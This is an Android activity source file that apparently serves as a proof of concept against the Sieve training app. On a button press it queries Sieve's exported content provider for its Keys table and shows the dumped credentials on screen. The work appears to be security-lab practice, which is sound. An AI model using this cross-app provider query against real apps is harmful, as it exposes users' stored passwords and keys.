package com.example.leekedited;

import androidx.appcompat.app.AppCompatActivity;

import android.os.Bundle;
import android.widget.TextView;
import android.widget.EditText;
import android.net.Uri;
import android.database.DatabaseUtils;

public class MainActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
    }
    public void changeMessage(android.view.View view) {

        final EditText textViewToChange = (EditText) findViewById(R.id.editText1);
        textViewToChange.setText(DatabaseUtils.dumpCursorToString(getContentResolver().query(Uri.parse("content://com.mwr.example.sieve.DBContentProvider/Keys/"), null, null, null, null)));
    }
}


